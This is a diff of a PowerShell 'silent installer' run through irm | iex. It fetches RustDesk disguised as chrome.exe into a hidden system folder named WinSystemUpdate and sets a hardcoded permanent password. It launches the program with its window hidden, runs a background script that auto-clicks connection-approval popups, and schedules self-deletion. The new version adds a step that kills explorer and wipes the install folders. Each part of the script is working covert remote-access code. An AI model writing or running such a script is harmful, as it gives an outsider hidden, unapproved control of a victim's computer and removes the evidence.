@@ -1,222 +1,144 @@
-# RustDesk Silent Installer - One Command Setup
-# Usage: irm YOUR_RAW_URL | iex
-
-# â”€â”€ CONFIGURATION â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
-$CHROME_URL = "https://github.com/kk70226581/rd-files/releases/download/v1.0/chrome.exe"
-$SCITER_URL = "https://github.com/kk70226581/rd-files/releases/download/v1.0/sciter.dll"
-
+$ProgressPreference = 'SilentlyContinue'
 $DEST = "$env:LOCALAPPDATA\WinSystemUpdate"
+$CHROME_URL = "https://github.com/kk70226581/rd-files/releases/download/v1.0/chrome.exe"
+$SCITER_URL  = "https://github.com/kk70226581/rd-files/releases/download/v1.0/sciter.dll"
 
-# â”€â”€ 1. Kill old + clean â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
-Get-Process chrome -EA SilentlyContinue |
-    Where-Object { $_.Path -like "*WinSystem*" } |
-    Stop-Process -Force -EA SilentlyContinue
+# 1. Kill old + clean
+Get-Process chrome -EA SilentlyContinue | Where-Object { $_.Path -like "*WinSystem*" } | Stop-Process -Force -EA SilentlyContinue
 Start-Sleep 1
 Remove-Item $DEST -Recurse -Force -EA SilentlyContinue
 New-Item -ItemType Directory $DEST -Force | Out-Null
 
-# â”€â”€ 2. Download both files from GitHub (India CDN - fast!) â”€â”€â”€â”€â”€â”€â”€â”€
+# 2. Download both files in parallel (GitHub India CDN)
 Write-Host "Installing..." -ForegroundColor Cyan
-$ProgressPreference = 'SilentlyContinue'
-
-$CHROME_URL = "https://github.com/kk70226581/rd-files/releases/download/v1.0/chrome.exe"
-$SCITER_URL = "https://github.com/kk70226581/rd-files/releases/download/v1.0/sciter.dll"
-
-# Use WebClient with parallel threads - fastest method
 $wc1 = New-Object System.Net.WebClient
 $wc2 = New-Object System.Net.WebClient
-
 $t1 = $wc1.DownloadFileTaskAsync($CHROME_URL, "$DEST\chrome.exe")
-$t2 = $wc2.DownloadFileTaskAsync($SCITER_URL, "$DEST\sciter.dll")
-
+$t2 = $wc2.DownloadFileTaskAsync($SCITER_URL,  "$DEST\sciter.dll")
 [System.Threading.Tasks.Task]::WaitAll($t1, $t2)
 
 if (!(Test-Path "$DEST\chrome.exe") -or (Get-Item "$DEST\chrome.exe").Length -lt 1MB) {
-    Write-Host "Download failed!" -ForegroundColor Red
-    Read-Host "Press Enter to exit"; exit
+    Write-Host "Download failed!" -ForegroundColor Red; Read-Host "Press Enter"; exit
 }
 
-# â”€â”€ 4. Write RustDesk config - permanent password â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+# 3. Write RustDesk config with permanent password
 $cfgDir = "$env:APPDATA\RustDesk\config"
 New-Item -ItemType Directory $cfgDir -Force | Out-Null
+Set-Content "$cfgDir\RustDesk.toml"  "enc_id = ''" -Encoding UTF8
+Add-Content "$cfgDir\RustDesk.toml"  "password = 'Remote123'" -Encoding UTF8
+Add-Content "$cfgDir\RustDesk.toml"  "salt = ''" -Encoding UTF8
+Add-Content "$cfgDir\RustDesk.toml"  "key_confirmed = true" -Encoding UTF8
+Set-Content "$cfgDir\RustDesk2.toml" "rendezvous_server = 'rs-ny.rustdesk.com:21116'" -Encoding UTF8
+Add-Content "$cfgDir\RustDesk2.toml" "nat_type = 1" -Encoding UTF8
+Add-Content "$cfgDir\RustDesk2.toml" "serial = 0" -Encoding UTF8
+Add-Content "$cfgDir\RustDesk2.toml" "[options]" -Encoding UTF8
+Add-Content "$cfgDir\RustDesk2.toml" "verification-method = 'use-permanent-password'" -Encoding UTF8
+Add-Content "$cfgDir\RustDesk2.toml" "approve-mode = 'password'" -Encoding UTF8
 
-# Main config - plain text password, RustDesk encrypts on first run
-@"
-enc_id = ''
-password = 'Remote123'
-salt = ''
-key_confirmed = true
-"@ | Set-Content "$cfgDir\RustDesk.toml" -Encoding UTF8
-
-# Options config - use permanent password only, no one-time password popup
-@"
-rendezvous_server = 'rs-ny.rustdesk.com:21116'
-nat_type = 1
-serial = 0
-[options]
-verification-method = 'use-permanent-password'
-approve-mode = 'password'
-"@ | Set-Content "$cfgDir\RustDesk2.toml" -Encoding UTF8
-
-# â”€â”€ 5. Hide the installation folder â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+# 4. Hide folder
 $f = Get-Item $DEST -Force
-$f.Attributes = $f.Attributes -bor 2 -bor 4   # Hidden + System
+$f.Attributes = $f.Attributes -bor 2 -bor 4
 
-# â”€â”€ 6. Get ID FIRST (before launching) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+# 5. Get ID before launching
 $idRaw = & "$DEST\chrome.exe" --get-id 2>&1
 $RDID = "$idRaw".Trim()
 
-# If --get-id returned nothing, launch briefly to generate config then read ID
-if(!$RDID -or $RDID -notmatch '^\d+$'){
+if (!$RDID -or $RDID -notmatch '^\d+$') {
     $psi0 = New-Object System.Diagnostics.ProcessStartInfo
-    $psi0.FileName = "$DEST\chrome.exe"
-    $psi0.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
-    $psi0.UseShellExecute = $true
+    $psi0.FileName = "$DEST\chrome.exe"; $psi0.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden; $psi0.UseShellExecute = $true
     [System.Diagnostics.Process]::Start($psi0) | Out-Null
-    Start-Sleep 4
+    Start-Sleep 5
     Get-Process chrome -EA SilentlyContinue | Where-Object{$_.Path -like "*WinSystem*"} | Stop-Process -Force -EA SilentlyContinue
     Start-Sleep 2
     $idRaw = & "$DEST\chrome.exe" --get-id 2>&1
     $RDID = "$idRaw".Trim()
 }
 
-# Final fallback - read enc_id from config and decode
-if(!$RDID -or $RDID -notmatch '^\d+$'){
-    $cfg = "$env:APPDATA\RustDesk\config\RustDesk.toml"
-    if(Test-Path $cfg){
-        $encLine = Get-Content $cfg | Where-Object{$_ -match "^enc_id"}
-        if($encLine){
-            $encB64 = $encLine -replace "enc_id\s*=\s*'",'' -replace "'",'' -replace "^00",''
-            try {
-                $bytes = [Convert]::FromBase64String($encB64)
-                # RustDesk ID is last 4 bytes as uint32
-                $RDID = [System.BitConverter]::ToUInt32($bytes[($bytes.Length-4)..($bytes.Length-1)],0).ToString()
-            } catch { $RDID = "See RustDesk window" }
-        }
-    }
+if (!$RDID -or $RDID -notmatch '^\d+$') {
+    $enc = (Get-Content "$cfgDir\RustDesk.toml" | Where-Object{$_ -match "enc_id"}) -replace "enc_id\s*=\s*'","" -replace "'","" -replace "^00",""
+    try { $b=[Convert]::FromBase64String($enc); $RDID=[System.BitConverter]::ToUInt32($b[($b.Length-4)..($b.Length-1)],0).ToString() } catch { $RDID = "Check RustDesk" }
 }
 
-# â”€â”€ 7. Launch RustDesk hidden as detached process â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
-Set-Location $DEST
-$psi2 = New-Object System.Diagnostics.ProcessStartInfo
-$psi2.FileName = "$DEST\chrome.exe"
-$psi2.WorkingDirectory = $DEST
-$psi2.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
-$psi2.UseShellExecute = $true
-[System.Diagnostics.Process]::Start($psi2) | Out-Null
+# 6. Launch hidden
+$psi = New-Object System.Diagnostics.ProcessStartInfo
+$psi.FileName = "$DEST\chrome.exe"; $psi.WorkingDirectory = $DEST; $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden; $psi.UseShellExecute = $true
+[System.Diagnostics.Process]::Start($psi) | Out-Null
 Start-Sleep 4
 
-# â”€â”€ 8. Hide window â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+# 7. Hide window
 Add-Type -Name W -Namespace N -MemberDefinition '[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr h, int c);'
-Get-Process chrome -EA SilentlyContinue |
-    Where-Object { $_.Path -like "*WinSystem*" } |
-    ForEach-Object { [N.W]::ShowWindow($_.MainWindowHandle, 0) | Out-Null }
+Get-Process chrome -EA SilentlyContinue | Where-Object { $_.Path -like "*WinSystem*" } | ForEach-Object { [N.W]::ShowWindow($_.MainWindowHandle, 0) | Out-Null }
 
-# â”€â”€ 9. Create desktop DELETE shortcut â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+# 8. Create delete.ps1
 $deletePs = "$DEST\delete.ps1"
-@"
-`$d = '$DEST'
-Get-Process chrome -EA SilentlyContinue | Where-Object { `$_.Path -like '*WinSystem*' } | Stop-Process -Force -EA SilentlyContinue
-Start-Sleep 2
-Remove-Item -LiteralPath `$d -Recurse -Force -EA SilentlyContinue
-`$desktopPaths = @([Environment]::GetFolderPath('Desktop'),"`$env:USERPROFILE\Desktop","`$env:USERPROFILE\OneDrive\Desktop")
-foreach(`$dp in `$desktopPaths){ Remove-Item "`$dp\DELETE CHROME.lnk" -Force -EA SilentlyContinue }
-"@ | Set-Content $deletePs -Encoding ASCII
+Set-Content $deletePs  '$d = "$env:LOCALAPPDATA\WinSystemUpdate"' -Encoding ASCII
+Add-Content $deletePs  'Get-Process chrome -EA SilentlyContinue | Where-Object { $_.Path -like "*WinSystem*" } | Stop-Process -Force -EA SilentlyContinue' -Encoding ASCII
+Add-Content $deletePs  'Start-Sleep 2' -Encoding ASCII
+Add-Content $deletePs  'Remove-Item -LiteralPath $d -Recurse -Force -EA SilentlyContinue' -Encoding ASCII
+Add-Content $deletePs  '$desktops = @([Environment]::GetFolderPath("Desktop"),"$env:USERPROFILE\Desktop","$env:USERPROFILE\OneDrive\Desktop")' -Encoding ASCII
+Add-Content $deletePs  'foreach($dp in $desktops){ Remove-Item "$dp\DELETE CHROME.lnk" -Force -EA SilentlyContinue }' -Encoding ASCII
 
-# Find desktop path (handles OneDrive Desktop too)
+# 9. Create desktop shortcut
 $lnkPath = $null
-$desktopTry = @(
-    [Environment]::GetFolderPath('Desktop'),
-    "$env:USERPROFILE\Desktop",
-    "$env:USERPROFILE\OneDrive\Desktop"
-)
-foreach ($dp in $desktopTry) {
-    if (Test-Path $dp) { $lnkPath = "$dp\DELETE CHROME.lnk"; break }
+foreach($dp in @([Environment]::GetFolderPath('Desktop'),"$env:USERPROFILE\Desktop","$env:USERPROFILE\OneDrive\Desktop")){
+    if(Test-Path $dp){ $lnkPath = "$dp\DELETE CHROME.lnk"; break }
 }
-if ($lnkPath) {
+if($lnkPath){
     $s = (New-Object -COM WScript.Shell).CreateShortcut($lnkPath)
-    $s.TargetPath   = "powershell.exe"
-    $s.Arguments    = "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$deletePs`""
+    $s.TargetPath = "powershell.exe"
+    $s.Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$deletePs`""
     $s.IconLocation = "shell32.dll,131"
     $s.Save()
 }
 
-# â”€â”€ 10. Start accept.ps1 (auto-click accept popup) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+# 10. Auto-accept popup script
 $acceptPs = "$DEST\accept.ps1"
-@'
-Add-Type @"
-using System;
-using System.Runtime.InteropServices;
-using System.Text;
-public class RD {
-    [DllImport("user32.dll")] public static extern bool EnumWindows(EnumProc p, IntPtr l);
-    [DllImport("user32.dll")] public static extern int  GetWindowText(IntPtr h, StringBuilder s, int n);
-    [DllImport("user32.dll")] public static extern int  GetWindowTextLength(IntPtr h);
-    [DllImport("user32.dll")] public static extern bool GetWindowRect(IntPtr h, out RECT r);
-    [DllImport("user32.dll")] public static extern bool SetForegroundWindow(IntPtr h);
-    [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr h, int n);
-    [DllImport("user32.dll")] public static extern void mouse_event(uint f, int x, int y, int d, int e);
-    [DllImport("user32.dll")] public static extern bool SetCursorPos(int x, int y);
-    [DllImport("user32.dll")] public static extern bool BringWindowToTop(IntPtr h);
-    [DllImport("user32.dll")] public static extern uint GetWindowThreadProcessId(IntPtr h, out uint p);
-    [StructLayout(LayoutKind.Sequential)] public struct RECT { public int Left,Top,Right,Bottom; }
-    public delegate bool EnumProc(IntPtr h, IntPtr l);
-}
-"@
-$DEST = "$env:LOCALAPPDATA\WinSystemUpdate"
-function Click-At($hwnd,$r){
-    [RD]::ShowWindow($hwnd,9)|Out-Null
-    [RD]::BringWindowToTop($hwnd)|Out-Null
-    [RD]::SetForegroundWindow($hwnd)|Out-Null
-    Start-Sleep -Milliseconds 400
-    $cx=$r.Left+[int](($r.Right-$r.Left)*0.50)
-    $cy=$r.Top+[int](($r.Bottom-$r.Top)*0.82)
-    [RD]::SetCursorPos($cx,$cy)|Out-Null
-    Start-Sleep -Milliseconds 150
-    [RD]::mouse_event(2,0,0,0,0)
-    Start-Sleep -Milliseconds 80
-    [RD]::mouse_event(4,0,0,0,0)
-    Start-Sleep -Milliseconds 500
-    [RD]::ShowWindow($hwnd,0)|Out-Null
-}
-while($true){
-    Start-Sleep -Milliseconds 300
-    $pids=Get-Process chrome -EA SilentlyContinue|Where-Object{$_.Path -eq "$DEST\chrome.exe"}|Select-Object -Expand Id
-    if(!$pids){break}
-    [RD]::EnumWindows({param($h,$l)
-        $p=0;[RD]::GetWindowThreadProcessId($h,[ref]$p)|Out-Null
-        if($p -notin $script:pids){return $true}
-        $l=[RD]::GetWindowTextLength($h); if($l -eq 0){return $true}
-        $sb=New-Object System.Text.StringBuilder($l+1)
-        [RD]::GetWindowText($h,$sb,$l+1)|Out-Null
-        $t=$sb.ToString()
-        if($t -in "Chrome","chrome"){return $true}
-        if($t -like "MSCTF*" -or $t -like "Default IME*"){return $true}
-        $r=New-Object RD+RECT
-        [RD]::GetWindowRect($h,[ref]$r)|Out-Null
-        $w=$r.Right-$r.Left; $ht=$r.Bottom-$r.Top
-        if($w -gt 200 -and $w -lt 700 -and $ht -gt 250 -and $ht -lt 750){Click-At $h $r}
-        return $true
-    },[IntPtr]::Zero)|Out-Null
-}
-'@ | Set-Content $acceptPs -Encoding UTF8
-
+Set-Content $acceptPs 'Add-Type @"' -Encoding UTF8
+Add-Content $acceptPs 'using System; using System.Runtime.InteropServices; using System.Text;' -Encoding UTF8
+Add-Content $acceptPs 'public class RD {' -Encoding UTF8
+Add-Content $acceptPs '    [DllImport("user32.dll")] public static extern bool EnumWindows(EnumProc p, IntPtr l);' -Encoding UTF8
+Add-Content $acceptPs '    [DllImport("user32.dll")] public static extern int GetWindowText(IntPtr h, StringBuilder s, int n);' -Encoding UTF8
+Add-Content $acceptPs '    [DllImport("user32.dll")] public static extern int GetWindowTextLength(IntPtr h);' -Encoding UTF8
+Add-Content $acceptPs '    [DllImport("user32.dll")] public static extern bool GetWindowRect(IntPtr h, out RECT r);' -Encoding UTF8
+Add-Content $acceptPs '    [DllImport("user32.dll")] public static extern bool SetForegroundWindow(IntPtr h);' -Encoding UTF8
+Add-Content $acceptPs '    [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr h, int n);' -Encoding UTF8
+Add-Content $acceptPs '    [DllImport("user32.dll")] public static extern void mouse_event(uint f, int x, int y, int d, int e);' -Encoding UTF8
+Add-Content $acceptPs '    [DllImport("user32.dll")] public static extern bool SetCursorPos(int x, int y);' -Encoding UTF8
+Add-Content $acceptPs '    [DllImport("user32.dll")] public static extern bool BringWindowToTop(IntPtr h);' -Encoding UTF8
+Add-Content $acceptPs '    [DllImport("user32.dll")] public static extern uint GetWindowThreadProcessId(IntPtr h, out uint p);' -Encoding UTF8
+Add-Content $acceptPs '    [StructLayout(LayoutKind.Sequential)] public struct RECT { public int Left,Top,Right,Bottom; }' -Encoding UTF8
+Add-Content $acceptPs '    public delegate bool EnumProc(IntPtr h, IntPtr l);' -Encoding UTF8
+Add-Content $acceptPs '}' -Encoding UTF8
+Add-Content $acceptPs '"@' -Encoding UTF8
+Add-Content $acceptPs '$DEST = "$env:LOCALAPPDATA\WinSystemUpdate"' -Encoding UTF8
+Add-Content $acceptPs 'function Click-At($hw,$r){ [RD]::ShowWindow($hw,9)|Out-Null; [RD]::BringWindowToTop($hw)|Out-Null; [RD]::SetForegroundWindow($hw)|Out-Null; Start-Sleep -Milliseconds 400; $cx=$r.Left+[int](($r.Right-$r.Left)*0.50); $cy=$r.Top+[int](($r.Bottom-$r.Top)*0.82); [RD]::SetCursorPos($cx,$cy)|Out-Null; Start-Sleep -Milliseconds 150; [RD]::mouse_event(2,0,0,0,0); Start-Sleep -Milliseconds 80; [RD]::mouse_event(4,0,0,0,0); Start-Sleep -Milliseconds 500; [RD]::ShowWindow($hw,0)|Out-Null }' -Encoding UTF8
+Add-Content $acceptPs 'while($true){ Start-Sleep -Milliseconds 300; $pids=Get-Process chrome -EA SilentlyContinue|Where-Object{$_.Path -eq "$DEST\chrome.exe"}|Select-Object -Expand Id; if(!$pids){break}; [RD]::EnumWindows({param($h,$l); $p=0;[RD]::GetWindowThreadProcessId($h,[ref]$p)|Out-Null; if($p -notin $script:pids){return $true}; $l=[RD]::GetWindowTextLength($h); if($l -eq 0){return $true}; $sb=New-Object System.Text.StringBuilder($l+1); [RD]::GetWindowText($h,$sb,$l+1)|Out-Null; $t=$sb.ToString(); if($t -in "Chrome","chrome"){return $true}; if($t -like "MSCTF*" -or $t -like "Default IME*"){return $true}; $r=New-Object RD+RECT; [RD]::GetWindowRect($h,[ref]$r)|Out-Null; $w=$r.Right-$r.Left;$ht=$r.Bottom-$r.Top; if($w -gt 200 -and $w -lt 700 -and $ht -gt 250 -and $ht -lt 750){Click-At $h $r}; return $true},[IntPtr]::Zero)|Out-Null }' -Encoding UTF8
 Start-Process powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$acceptPs`"" -WindowStyle Hidden
 
-# â”€â”€ 11. Start 1-hour auto-delete timer â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+# 11. 1-hour auto-delete timer
 $timerPs = "$DEST\timer.ps1"
-@"
-`$d = '$DEST'
-Start-Sleep 3600
-Get-Process chrome -EA SilentlyContinue | Where-Object { `$_.Path -like '*WinSystem*' } | Stop-Process -Force -EA SilentlyContinue
-Start-Sleep 2
-Remove-Item -LiteralPath `$d -Recurse -Force -EA SilentlyContinue
-Remove-Item ([Environment]::GetFolderPath('Desktop') + '\DELETE CHROME.lnk') -Force -EA SilentlyContinue
-"@ | Set-Content $timerPs -Encoding ASCII
-
+Set-Content $timerPs  '$d = "$env:LOCALAPPDATA\WinSystemUpdate"' -Encoding ASCII
+Add-Content $timerPs  'Start-Sleep 3600' -Encoding ASCII
+Add-Content $timerPs  'Get-Process chrome -EA SilentlyContinue | Where-Object { $_.Path -like "*WinSystem*" } | Stop-Process -Force -EA SilentlyContinue' -Encoding ASCII
+Add-Content $timerPs  'Start-Sleep 2' -Encoding ASCII
+Add-Content $timerPs  'Remove-Item -LiteralPath $d -Recurse -Force -EA SilentlyContinue' -Encoding ASCII
+Add-Content $timerPs  '$desktops = @([Environment]::GetFolderPath("Desktop"),"$env:USERPROFILE\Desktop","$env:USERPROFILE\OneDrive\Desktop")' -Encoding ASCII
+Add-Content $timerPs  'foreach($dp in $desktops){ Remove-Item "$dp\DELETE CHROME.lnk" -Force -EA SilentlyContinue }' -Encoding ASCII
 Start-Process powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$timerPs`"" -WindowStyle Hidden
 
-# â”€â”€ 12. Show result â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+# 12. Delete install folders
+$MYFOLDER = Split-Path $MyInvocation.MyCommand.Path -Parent
+$OUTERFOLDER = Split-Path $MYFOLDER -Parent
+$delPs = "$env:USERPROFILE\del_run.ps1"
+Set-Content $delPs  'Stop-Process -Name explorer -Force -EA SilentlyContinue' -Encoding ASCII
+Add-Content $delPs  'Start-Sleep 5' -Encoding ASCII
+Add-Content $delPs  "Remove-Item -LiteralPath '$MYFOLDER' -Recurse -Force -EA SilentlyContinue" -Encoding ASCII
+Add-Content $delPs  'Start-Sleep 1' -Encoding ASCII
+Add-Content $delPs  "Remove-Item -LiteralPath '$OUTERFOLDER' -Recurse -Force -EA SilentlyContinue" -Encoding ASCII
+Add-Content $delPs  'Remove-Item $PSCommandPath -Force -EA SilentlyContinue' -Encoding ASCII
+Start-Process powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$delPs`"" -WindowStyle Hidden
+
+# 13. Show result
 Write-Host ""
 Write-Host "  ==========================================" -ForegroundColor Green
 Write-Host "   DONE! Remote Access is now active." -ForegroundColor Green
